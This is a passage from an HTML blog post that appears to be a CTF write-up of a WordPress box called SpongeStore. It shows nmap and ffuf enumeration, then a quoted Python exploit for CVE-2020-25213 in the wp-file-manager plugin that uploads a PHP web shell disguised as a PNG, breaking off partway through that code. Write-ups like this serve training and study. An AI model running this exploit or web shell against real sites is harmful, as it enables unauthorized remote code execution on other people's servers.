@@ -1,0 +1,717 @@
+<!doctype html>
+
+<html class="no-js" lang="en">
+
+<head>
+    <meta charset="utf-8">
+<title>Midterm-CTF 2022: SpongeStore &#8211; Joe Butler</title>
+<meta name="description" content="Website">
+<meta name="keywords" content="CTF, Medium box, Wordpress, GTFOBins, CVE, Werkzeug, tshark">
+
+<!-- MathJax -->
+<script type="text/javascript" async src="https://cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Midterm-CTF 2022: SpongeStore">
+<meta property="og:description" content="Website">
+<meta property="og:url" content="/2022/03/06/spongeStore.html">
+<meta property="og:site_name" content="Joe Butler">
+
+
+
+
+
+<link rel="canonical" href="/2022/03/06/spongeStore.html">
+
+
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+
+
+<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+
+
+
+    <br>
+    <center>
+        <span class="main-header-image">
+            <h1 style="font-weight:100; font-kerning:normal"><a href="/">Joe Butler</a></h1>
+        </span>
+    </center>
+
+    <!-- NAVIGATION -->
+    <br>
+    <center>
+    <nav class="header-nav">
+        <ul class="navigation-bar">
+            <li><a href="/">HOME</a></li>
+            <li><a href="/tags/">TAGS</a></li>
+            <li><a href="/about/">ABOUT</a></li>
+            <li><a href="/search/">SEARCH</a></li>
+        </ul>
+    </nav>
+</center>
+
+</head>
+
+<!-- BODY -->
+<body id="post-index">
+
+    <!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+    <script src="/assets/js/scrollToTop.js"></script>
+    <script>addBackToTop({
+      diameter: 32,
+      backgroundColor: 'rgb(51,51,51)',
+      textColor: '#fff'
+    })</script>
+  
+    <div id="main" role="main">
+        <article class="hentry">
+
+            <div class="featured-image">
+            </div>
+            <br />
+            <!-- MAIN -->
+            <h1 class="entry-title">
+                Midterm-CTF 2022: SpongeStore
+            </h1>
+            <h3 class="entry-subtitle">
+                
+              
+            </h3>
+            
+            <hr>
+          
+            <!-- POST CONTENT -->
+            <div class="entry-content">
+                <ul id="toc" class="section-nav">
+<li class="toc-entry toc-h1"><a href="#summary">Summary</a></li>
+<li class="toc-entry toc-h1"><a href="#enumeration">Enumeration</a></li>
+<li class="toc-entry toc-h1"><a href="#foothold">Foothold</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#port-forwarding-the-internal-web-server">Port forwarding the internal web server</a></li>
+<li class="toc-entry toc-h2"><a href="#enumerating-the-internal-page">Enumerating the internal page</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h1"><a href="#user">User</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#werkzeug-pin-exploit">Werkzeug PIN exploit</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#obtaining-werkzeug-pin-exploit-values">Obtaining Werkzeug PIN exploit values</a>
+<ul>
+<li class="toc-entry toc-h4"><a href="#getattrmod-__file__-none">getattr(mod, &#39;__file__&#39;, None)</a></li>
+<li class="toc-entry toc-h4"><a href="#struuidgetnode--sysclassnetens33address">str(uuid.getnode()),  /sys/class/net/ens33/address</a></li>
+<li class="toc-entry toc-h4"><a href="#get_machine_id-etcmachine-id">get_machine_id(), /etc/machine-id</a></li>
+<li class="toc-entry toc-h4"><a href="#running-the-exploit">Running the exploit</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h3"><a href="#fixing-the-issue">Fixing the issue</a></li>
+<li class="toc-entry toc-h3"><a href="#getting-user-shell">Getting user shell</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li class="toc-entry toc-h1"><a href="#root">Root</a>
+<ul>
+<li class="toc-entry toc-h2"><a href="#getting-angus-password">Getting Angus’ password</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#looking-for-a-password">Looking for a password</a></li>
+<li class="toc-entry toc-h3"><a href="#password-reuse">Password reuse</a></li>
+</ul>
+</li>
+<li class="toc-entry toc-h2"><a href="#escalating-to-root">Escalating to root</a>
+<ul>
+<li class="toc-entry toc-h3"><a href="#exploiting-tshark-sudo-privileges">Exploiting tshark sudo privileges</a></li>
+</ul>
+</li>
+</ul>
+</li>
+</ul><h1 id="summary">
+<a class="anchor" href="#summary" aria-hidden="true"><span class="octicon octicon-link"></span></a>Summary</h1>
+<p>SpongeStore is a fun medium box that starts off with gaining RCE from a vulnerable wordpress plugin followed by exploiting an internal werkzeug instance to pivot to get the user flag and password re-use for an ssh shell as Angus. Root is a simple tshark sudo gtfobin to complete the box.</p>
+
+<h1 id="enumeration">
+<a class="anchor" href="#enumeration" aria-hidden="true"><span class="octicon octicon-link"></span></a>Enumeration</h1>
+
+<p>Starting with an initial nmap:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sudo nmap -sC -sV -A -T4 192.168.102.145
+Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-05 22:57 GMT
+Nmap scan report for 192.168.102.145
+Host is up (0.00051s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
+|_http-generator: WordPress 5.8.2
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: SpongeStore &amp;#8211; The spongiest store around!
+MAC Address: 00:0C:29:8E:DB:38 (VMware)
+No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=7.80%E=4%D=1/5%OT=22%CT=1%CU=37766%PV=Y%DS=1%DC=D%G=Y%M=000C29%TM
+OS:=61D6225D%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=108%TI=Z%CI=Z%II=I%
+OS:TS=A)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5
+OS:=M5B4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=
+OS:FE88)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%
+OS:A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0
+OS:%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S
+OS:=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R
+OS:=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N
+OS:%T=40%CD=S)
+
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.51 ms 192.168.102.145
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.11 seconds
+</code></pre></div></div>
+
+<p>Only SSH (port 22/tcp) and HTTP (80) are open so the web server is most likely going to be the entrypoint.</p>
+
+<p>Browsing to the website redirects to <code class="language-plaintext highlighter-rouge">spongestore.wmg</code> so that can be added to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> so everything loads correctly to show:</p>
+
+<p><img src="https://i.imgur.com/nCG8ulm.png" alt="picture"></p>
+
+<p>The website appears mostly empty aside from the bottom of the page:</p>
+
+<p><img src="https://i.imgur.com/QruPGIh.png" alt="picture"></p>
+
+<p>Firstly, there are some names which might be useful should usernames be needed to bruteforce any passwords or credentials. There is also a comment stating: <code class="language-plaintext highlighter-rouge">SpongeStore, proudly powered by WordPress</code>. This means that the website is running wordpress so there might be some vulnerable plugins that could be exploited to gain access to the system. FFUF reinforces this since the only pages returned are wordpress related:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ffuf -w /opt/programs/SecLists/Discovery/Web-Content/raft-medium-words.txt -u http://spongestore.wmg/FUZZ.php -fc 403
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.2.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://spongestore.wmg/FUZZ.php
+ :: Wordlist         : FUZZ: /opt/programs/SecLists/Discovery/Web-Content/raft-medium-words.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+ :: Filter           : Response status: 403
+________________________________________________
+
+index                   [Status: 301, Size: 0, Words: 1, Lines: 1]
+wp-login                [Status: 200, Size: 6690, Words: 322, Lines: 110]
+wp-trackback            [Status: 200, Size: 135, Words: 11, Lines: 5]
+xmlrpc                  [Status: 405, Size: 42, Words: 6, Lines: 1]
+wp-config               [Status: 200, Size: 0, Words: 1, Lines: 1]
+wp-links-opml           [Status: 200, Size: 226, Words: 12, Lines: 12]
+wp-blog-header          [Status: 200, Size: 0, Words: 1, Lines: 1]
+wp-cron                 [Status: 200, Size: 0, Words: 1, Lines: 1]
+wp-load                 [Status: 200, Size: 0, Words: 1, Lines: 1]
+wp-signup               [Status: 302, Size: 0, Words: 1, Lines: 1]
+wp-activate             [Status: 302, Size: 0, Words: 1, Lines: 1]
+:: Progress: [63087/63087] :: Job [1/1] :: 4756 req/sec :: Duration: [0:00:05] :: Errors: 0 ::
+</code></pre></div></div>
+
+<p>WPScan doesn’t find anything useful:</p>
+
+<p><img src="https://i.imgur.com/UOPtUff.png" alt="picture"></p>
+
+<p>However there could be plugins that it did not find that might be useful. Browsing to ` http://spongestore.wmg/wp-content/plugins` (a common directory for wordpress plugins to be located and hinted by the themes directory) shows:</p>
+
+<p><img src="https://i.imgur.com/AwaHD8H.png" alt="picture"></p>
+
+<p>Searching for CVEs for wp-file-manager plugin shows:</p>
+
+<p><img src="https://i.imgur.com/oMV6rN1.png" alt="picture"></p>
+
+<p>Which (according to <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-25213">CVE.mitre.org</a>) affects all versions before 6.9.  Looking at the readme for the installed plugin:</p>
+
+<p><img src="https://i.imgur.com/AJcC6Jt.png" alt="picture"></p>
+
+<p>It appears to be version 6.0 so should be exploitable.</p>
+
+<h1 id="foothold">
+<a class="anchor" href="#foothold" aria-hidden="true"><span class="octicon octicon-link"></span></a>Foothold</h1>
+
+<p>An exploit can be found on <a href="https://github.com/w4fz5uck5/wp-file-manager-0day">github</a> that shows that the exploit:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python2
+</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="k">print</span><span class="p">(</span><span class="s">"Usage: %s http://localhost"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span>
+
+<span class="n">burp0_url</span> <span class="o">=</span> <span class="s">"%s/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php"</span> <span class="o">%</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+<span class="n">burp0_headers</span> <span class="o">=</span> <span class="p">{</span><span class="s">"User-Agent"</span><span class="p">:</span> <span class="s">"curl/7.68.0"</span><span class="p">,</span> <span class="s">"Accept"</span><span class="p">:</span> <span class="s">"*/*"</span><span class="p">,</span> <span class="s">"Content-Type"</span><span class="p">:</span> <span class="s">"multipart/form-data; boundary=------------------------66e3ca93281c7050"</span><span class="p">,</span> <span class="s">"Expect"</span><span class="p">:</span> <span class="s">"100-continue"</span><span class="p">,</span> <span class="s">"Connection"</span><span class="p">:</span> <span class="s">"close"</span><span class="p">}</span>
+<span class="n">burp0_data</span> <span class="o">=</span> <span class="s">"--------------------------66e3ca93281c7050</span><span class="se">\r\n</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">cmd</span><span class="se">\"\r\n\r\n</span><span class="s">upload</span><span class="se">\r\n</span><span class="s">--------------------------66e3ca93281c7050</span><span class="se">\r\n</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">target</span><span class="se">\"\r\n\r\n</span><span class="s">l1_Lw</span><span class="se">\r\n</span><span class="s">--------------------------66e3ca93281c7050</span><span class="se">\r\n</span><span class="s">Content-Disposition: form-data; name=</span><span class="se">\"</span><span class="s">upload[]</span><span class="se">\"</span><span class="s">; filename=</span><span class="se">\"</span><span class="s">x.php</span><span class="se">\"\r\n</span><span class="s">Content-Type: image/png</span><span class="se">\r\n\r\n\x89</span><span class="s">PNG</span><span class="se">\r\n\x1a\n\x00\x00\x00\r</span><span class="s">IHDR</span><span class="se">\x00\x00\x01</span><span class="s">^</span><span class="se">\x00\x00\x01</span><span class="s">^</span><span class="se">\x04\x03\x00\x00\x00</span><span class="s">?</span><span class="se">\x05</span><span class="s">j)</span><span class="se">\x00\x00\x00\x1e</span><span class="s">PLTE</span><span class="se">\xff\xff\xff\xef\xef\xef\xe5\xe5\xe5\xce\xce\xce\xa1\xa1\xa1</span><span class="s">iiiVVVGGG333</span><span class="se">\x00\x00\x00</span><span class="s">g</span><span class="se">\x00\xcc\xe2\x00\x00\r\xc0</span><span class="s">IDATx</span><span class="se">\xda\xed</span><span class="s">]K[</span><span class="se">\xdb\xc8\x12</span><span class="s">m</span><span class="se">\xc9\xce</span><span class="s">^</span><span class="se">\xc6\x90\xbb</span><span class="s">58</span><span class="se">\t\xdc\x9d</span><span class="s">m</span><span class="se">\x9c\t\xd9\xd9</span><span class="s">X</span><span class="se">\x1e\xc2\x8e\x87</span><span class="s">I</span><span class="se">\xc2</span><span class="s">2</span><span class="se">\t</span><span class="s">!</span><span class="se">\x93\xe5</span><span class="s">@xmc</span><span class="se">\x02\xf1\xda\x0f\xa9\xff\xed</span><span class="s">]`</span><span class="se">\xeb\xdd</span><span class="s">VU</span><span class="se">\xc9</span><span class="s">C</span><span class="se">\xb5\xe6\xa2</span><span class="s">-</span><span class="se">\xd4\xa7\xf2</span><span class="s">Q</span><span class="se">\xe9\xa8\x1f</span><span class="s">uN</span><span class="se">\x8b\xdf\xb9\xba\xee\x84\xbc\"</span><span class="s">^</span><span class="se">\xd7\x83\xc7\x8f\xbc\x9a\x08\xa7\xb1</span><span class="s">F</span><span class="se">\xbb\xaa\x97\xf4\xc8</span><span class="s">:5</span><span class="se">\xf2</span><span class="s">^L,A</span><span class="se">\xbb\x8c</span><span class="s">Sr</span><span class="se">\xe4\x05</span><span class="s">5</span><span class="se">\xd2\xbc\x17\x0e</span><span class="s">C</span><span class="se">\xbe\xe4</span><span class="s">H</span><span class="se">\xf3</span><span class="s">NL*</span><span class="se">\x8f\x8f\xd2</span><span class="s">i</span><span class="se">\xbe\xf0</span><span class="s">5Y</span><span class="se">\xf0</span><span class="s">5</span><span class="se">\xff</span><span class="s">M</span><span class="se">\xf5</span><span class="s">[*</span><span class="se">\x95</span><span class="s">J</span><span class="se">\xb9\xc1\xb7\xdc\xb4\x8f\xde\x9f\x1e\xf5\xec\x86\x95\x83\xfa\xad</span><span class="s">v</span><span class="se">\xff\x92\xd3\xcb\xfd\xba</span><span class="s">]</span><span class="se">\xd1\x86\x1f\x92</span><span class="s">Q2</span><span class="se">\xec</span><span class="s">k</span><span class="se">\x19\xb8\xdc\x93</span><span class="s">FB</span><span class="se">\xa4</span><span class="s">&gt;</span><span class="se">\xf5</span><span class="s">[</span><span class="se">\xde\x91\x91</span><span class="s">k</span><span class="se">\xd2\xd1\x18\xdf\xea</span><span class="s">G</span><span class="se">\x19\xbb\xdc</span><span class="s">CK</span><span class="se">\xd7\xfa</span><span class="s">-</span><span class="se">\x97\x12\x90\xb0</span><span class="s">.</span><span class="se">\xfc</span><span class="s">P&gt;</span><span class="se">\x96</span><span class="s">29a-</span><span class="se">\xf9\xd7\xdc\x95\x8a\xcb\xdd\xd6\x11\xdf\x1d\xa9\xbc</span><span class="s">&amp;5</span><span class="se">\xfd\xea\xf7\xe5</span><span class="s">@</span><span class="se">\x9d\xaf\xbc\xad\xe8\xc6\x0f\x85</span><span class="s">c9</span><span class="se">\xef</span><span class="s">:</span><span class="se">\xd0\x8c</span><span class="s"></span><span class="se">\x8d\x9d\xb9\xe9</span><span class="s">J</span><span class="se">\xa7\xa6\x17\xbe\xcb\x83\xf9\xf9\xca</span><span class="s">[</span><span class="se">\xad\xea\xd7\xd8</span><span class="s">MIW</span><span class="se">\xba</span><span class="s">-</span><span class="se">\x9d\xf8\xe1\x85</span><span class="s">L</span><span class="se">\xbd</span><span class="s">n-}</span><span class="se">\xf8</span><span class="s">7</span><span class="se">\x1d</span><span class="s">^)eK</span><span class="se">\x1f</span><span class="s">|</span><span class="se">\x97\x01\xe9\xfa\x15\xcc</span><span class="s">_</span><span class="se">\xbf\x10</span><span class="s">x</span><span class="se">\xa5</span><span class="s">[</span><span class="se">\xd3\x85\x1f\n\x03</span><span class="s">H</span><span class="se">\xbe\xf2\\\x17\xfe</span><span class="s">}</span><span class="se">\x03</span><span class="s">JW</span><span class="se">\x8e</span><span class="s">+z</span><span class="se">\xe0</span><span class="s">k</span><span class="se">\x1c\xc3\xf2\x95</span><span class="s">m=</span><span class="se">\xea\xb7\x08</span><span class="s">LW</span><span class="se">\x8e\xf4\xe0\x87</span><span class="s">-h</span><span class="se">\xbe\xd3</span><span class="s">{1</span><span class="se">\xf3\xaf\t</span><span class="s">-</span><span class="se">\x07</span><span class="s">)</span><span class="se">\xf7</span><span class="s">t</span><span class="se">\xc0\x17\\\x0e</span><span class="s">R</span><span class="se">\xf6</span><span class="s">u</span><span class="se">\xa8\xdf</span><span class="s">ux</span><span class="se">\xbe\x0f\x8b\xb7\xbc\xfc\x00\xfa\x16\x87\xbe\xc9\xbc\xfc\x0b\xfc</span><span class="s">X&lt;</span><span class="se">\\\x9f\xf8\xf1</span><span class="s">E</span><span class="se">\x94\xef\x94\xd1</span><span class="s">x</span><span class="se">\xeb\xf7\r</span><span class="s">&amp;</span><span class="se">\xdf\xb1\xc5\xce\x0f\x98\xf2\x95\xb2\xc6\xcd\xbf\xc6</span><span class="s">wT</span><span class="se">\xbe\xfb\xdc\xf8\x16</span><span class="s">P</span><span class="se">\xe9\xca\x9f\xdc\xf5\xbb\x8c\xcb</span><span class="s">w</span><span class="se">\xc4\xcd\x0f\x1b\xb8</span><span class="s">|</span><span class="se">\xc7\x16</span><span class="s">3</span><span class="se">\xff\xbe\xc5\xe5\xeb\xd6</span><span class="s">x</span><span class="se">\xf1</span><span class="s">5p</span><span class="se">\xf4</span><span class="s"> e</span><span class="se">\x8b\xb7</span><span class="s">~</span><span class="se">\x91\xf4</span><span class="s"> e</span><span class="se">\x9b\x97\x1f\xcc\x01</span><span class="s">2</span><span class="se">\xdf\xbf</span><span class="s">y</span><span class="se">\xf9\x17</span><span class="s">IgR</span><span class="se">\xf6</span><span class="s">y</span><span class="se">\xf1</span><span class="s">]</span><span class="se">\xc6\xe6</span><span class="s">;</span><span class="se">\xe4\xad\xdf</span><span class="s">g</span><span class="se">\xd8</span><span class="s">|G</span><span class="se">\x16</span><span class="s">+?</span><span class="se">\xac</span><span class="s">`</span><span class="se">\xf3\x1d\xf3\xf2\xef</span><span class="s">::_^|</span><span class="se">\xb7\xb0\xf9</span><span class="s">:</span><span class="se">\x16</span><span class="s">k</span><span class="se">\xfd\xbe\xc5\xe6\xeb</span><span class="s">V</span><span class="se">\xb2\xf0</span><span class="s">Yf|</span><span class="se">\xf1\xf9\xd6</span><span class="s">X</span><span class="se">\xf1\xc5</span><span class="s">~</span><span class="se">\x8e\xa5\xcc\x19\xbe</span><span class="s">2o</span><span class="se">\xf8\xd6\x84</span><span class="s">q</span><span class="se">\xc9\x87</span><span class="s">/%_</span><span class="se">\xf3</span><span class="s">k</span><span class="se">\x8e\xf8</span><span class="s">![=&lt;&gt;</span><span class="se">\xbe\xcc\xfc</span><span class="s">@</span><span class="se">\xe1</span><span class="s">3</span><span class="se">\xce\xef\x1b\xe5</span><span class="s">{</span><span class="se">\xc1\x89\xef\x06</span><span class="s">6</span><span class="se">\xdf\t</span><span class="s">/</span><span class="se">\xff</span><span class="s">R</span><span class="se">\xc6</span><span class="s">;</span><span class="se">\x9c\xf8\xae</span><span class="s">P</span><span class="se">\xc6\xbf\x8c\xf8\xe2\xc7\xeb\xbc\xf3\x8b\"</span><span class="s">z&gt;</span><span class="se">\xc4\x8b\xef</span><span class="s">#</span><span class="se">\xcf</span><span class="s">73</span><span class="se">\xe3\x8b\x9e\xcf</span><span class="s"></span><span class="se">\x12\xac\xf8\x1a\xc7\xc8</span><span class="s">|</span><span class="se">\x99\xd7</span><span class="s">w</span><span class="se">\x04</span><span class="s">a=</span><span class="se">\x8a\x13</span><span class="s">_</span><span class="se">\xf4</span><span class="s">z_</span><span class="se">\x85\x19\xdf</span><span class="s">W</span><span class="se">\xf8\xf5</span><span class="s">T</span><span class="se">\xce\xf1</span><span class="s">/e</span><span class="se">\xbd\x9a</span><span class="s">s</span><span class="se">\xfc\x8b</span><span class="s">%</span><span class="se">\xb4</span><span class="s">3</span><span class="se">\xc1\x8c</span><span class="s">/</span><span class="se">\x92</span><span class="s"> </span><span class="se">\xf6\xd8\xf7\xe7\xf1\xfb</span><span class="s">Y</span><span class="se">\xbc\xfb</span><span class="s">o</span><span class="se">\xaf\xb0\xaf\x1b\xf3\xfe</span><span class="s">&amp;j</span><span class="se">\x04</span><span class="s">1</span><span class="se">\x14\xec\xfb\xc7\xe6\r\"\xdf\x03\xc1\xdf\x1f\xb5\x8b</span><span class="s">,_</span><span class="se">\xee\xfe</span><span class="s">(D</span><span class="se">\x01</span><span class="s">?tt1</span><span class="se">\xf7\x97</span><span class="s">&lt;f?</span><span class="se">\xcc</span><span class="s">B</span><span class="se">\xfa\xa3\x8e</span><span class="s">1</span><span class="se">\x83\x1d\r\xfa</span><span class="s">S</span><span class="se">\xd7\x11</span><span class="s">sc</span><span class="se">\x1d\xf0</span><span class="s">-</span><span class="se">\xe2\xca\x81\xbd\xbf\x0f\xbc</span><span class="s">'</span><span class="se">\xdb\x8e</span><span class="s">F</span><span class="se">\xf2\xe0</span><span class="s">+</span><span class="se">\xfe\xc0\xf5</span><span class="s">{</span><span class="se">\xb2\xf7\xa7\x16</span><span class="s">`</span><span class="se">\x9f\x8c\xcf</span><span class="s">B</span><span class="se">\x13</span><span class="s">|</span><span class="se">\xc5</span><span class="s">;</span><span class="se">\xd0\xce</span><span class="s">PM</span><span class="se">\xe8</span><span class="s">Q</span><span class="se">\xbf</span><span class="s">B</span><span class="se">\x14\x07\xf0\xb7</span><span class="s">M</span><span class="se">\x0b</span><span class="s">}</span><span class="se">\x00\xe0\x8d</span><span class="s">s</span><span class="se">\xeb\xde</span><span class="s">/</span><span class="se">\xe5\xd7\xb7</span><span class="s">,</span><span class="se">\xa7\x03</span><span class="s">|+4</span><span class="se">\xc2\xd7</span><span class="s">H</span><span class="se">\xad</span><span class="s">`</span><span class="se">\xb7\xb6\x88</span><span class="s">|</span><span class="se">\x17\xa6\x1f</span><span class="s">J</span><span class="se">\xad\xe0</span><span class="s">sK</span><span class="se">\x11\xc9\x82</span><span class="s">o*</span><span class="se">\x07\x8f\x03</span><span class="s">z'-</span><span class="se">\xf4\xb1</span><span class="s">)z</span><span class="se">\xb2</span><span class="s">mu$</span><span class="se">\x0f\xbe\xf3</span><span class="s">_</span><span class="se">\xb9\x1f\xd6\x9c</span><span class="s">H</span><span class="se">\x16</span><span class="s">|</span><span class="se">\x85</span><span class="s">x</span><span class="se">\x9d\xfe</span><span class="s">%</span><span class="se">\xd6\x86\x1f\x84\x10\xc2</span><span class="s">Tr</span><span class="se">\xc4\xa4\x1d\xfe\xa5\x9a\xe8\xbb\x0b\xef</span><span class="s">@</span><span class="se">\xf2</span><span class="s">X}</span><span class="se">\xfc\t\xca\x1f\x93\xd3</span><span class="s">]</span><span class="se">\x9c</span><span class="s">^z</span><span class="se">\xc1\xfa\xf9</span><span class="s">$</span><span class="se">\x84\x9d\x8e\x05\x88</span><span class="s">d</span><span class="se">\xc1</span><span class="s">W</span><span class="se">\x88\xa5</span><span class="s">n</span><span class="se">\x94</span><span class="s">%~m</span><span class="se">\xc7</span><span class="s">#5</span><span class="se">\xf2\xd7</span><span class="s">0</span><span class="se">\x9a\xa1\x9a</span><span class="s">pz</span><span class="se">\x15</span><span class="s">h$</span><span class="se">\x0b\xbe</span><span class="s">B</span><span class="se">\x88</span><span class="s">B</span><span class="se">\xf3\xc3\x0c\xe3\xbb</span><span class="s">^</span><span class="se">\x03\x13\xc9\x81\xaf\x10</span><span class="s">B</span><span class="se">\x94</span><span class="s">6</span><span class="se">\xed</span><span class="s">n</span><span class="se">\xf7\xa8</span><span class="s">kw</span><span class="se">\xd6</span><span class="s">p</span><span class="se">\xbf\x94\x07\xdf</span><span class="s">i</span><span class="se">\xce</span><span class="s">B</span><span class="se">\xfd\xd7\xbc\xf9\x1b\xe5\xcd</span><span class="s">'o</span><span class="se">\xfe</span><span class="s">FF</span><span class="se">\xde\xf0\xfd</span><span class="s"></span><span class="se">\xf2\xe7</span><span class="s">rVK</span><span class="se">\xb4</span><span class="s">k</span><span class="se">\xe9\xb4</span><span class="s">B</span><span class="se">\x8d\xbc\xa4\xde\xb3</span><span class="s">p/</span><span class="se">\xdc\xaf</span><span class="s">G</span><span class="se">\xb4\xeb\xfd\xe0\xe8\xf1</span><span class="s">#'B</span><span class="se">\xde</span><span class="s">S</span><span class="se">\xbd\xf4\xe4</span><span class="s">5</span><span class="se">\xd5\xbf\xcf\xa5\xde\xf3\xda\x11\x0e\xd9</span><span class="s">K</span><span class="se">\xef\x94\x1c\xf9</span><span class="s">m</span><span class="se">\x8d\x1a</span><span class="s">y</span><span class="se">\x97\xb3\xf7\xed</span><span class="s">&gt;</span><span class="se">\x83\x1f\xde\xd3\xf7\xed\xe9\xfb\xf6\xf4</span><span class="s">}</span><span class="se">\x8b\xfc</span><span class="s">imssss</span><span class="se">\xcd\xca</span><span class="s">E</span><span class="se">\xfd\x1a</span><span class="s">e</span><span class="se">\xfb\xfd\xf5</span><span class="s">@J</span><span class="se">\xf7\xfe\xc8</span><span class="s">n</span><span class="se">\xe8</span><span class="s">?</span><span class="se">\xfe</span><span class="s">-</span><span class="se">\x07\xad\xf4\xee</span><span class="s">z</span><span class="se">\xab\xda\xe0\x9b</span><span class="s">&lt;</span><span class="se">\xbf</span><span class="s">hF</span><span class="se">\x16</span><span class="s">/~u,</span><span class="se">\x8d\xf1</span><span class="s">5^</span><span class="se">\x0f\xe2</span><span class="s">6o</span><span class="se">\x15</span><span class="s">m</span><span class="se">\xeb\xd7\xf8</span><span class="s">3ie(</span><span class="se">\xb6\x18\xa0\x0b</span><span class="s">?$</span><span class="se">\xa7</span><span class="s">+e</span><span class="se">\xcf\xd2\x92</span><span class="s"></span><span class="se">\r\xe5</span><span class="s">Rl</span><span class="se">\xc4\xaa</span><span class="s">P</span><span class="se">\x13</span><span class="s">|</span><span class="se">\xd5\xd6</span><span class="s">t</span><span class="se">\xee\xbe\x86\xf5</span><span class="s">[</span><span class="se">\x9c\xb3\x9d\xeb\xd4\xb5\xe3\x07</span><span class="s">s</span><span class="se">\xee</span><span class="s">f</span><span class="se">\xe3\xa8\xa2\x1b\xff\xbe\x9e\xbf\xb3</span><span class="s">t</span><span class="se">\xa8\x19\xbe</span><span class="s">i</span><span class="se">\x9b\xfb</span><span class="s">A/H</span><span class="se">\x1d\xea\xf7\x1d</span><span class="s">|#W</span><span class="se">\x07</span><span class="s">~H</span><span class="se">\xdf\xda\x0f</span><span class="s">:</span><span class="se">\xff\xf1\xf3</span><span class="s">/</span><span class="se">\xa0</span><span class="s">u</span><span class="se">\xe2</span><span class="s">V#|!</span><span class="se">\x9d\x13</span><span class="s">&gt;</span><span class="se">\xc0\xfc\xf5\xfb</span><span class="s">N</span><span class="se">\xa2</span><span class="s">:=</span><span class="se">\xb8\xf9\x01\xd6\xf9\xe3\xf5\"\xb0\xf3</span><span class="s">/</span><span class="se">\xb0\xf7\xf2\xb3</span><span class="s">&amp;</span><span class="se">\xf8</span><span class="s">B</span><span class="se">\x9b\xc9\xc7\x96\x1e\xf5\x0b\xee\x0c</span><span class="s">l</span><span class="se">\xe9</span><span class="s">&lt;?php system($_GET[</span><span class="se">\"</span><span class="s">cmd</span><span class="se">\"</span><span class="s">]); ?&gt;</span><span class="se">\r\n</span><span class="s">--------------------------66e3ca93281c7050--</span><span 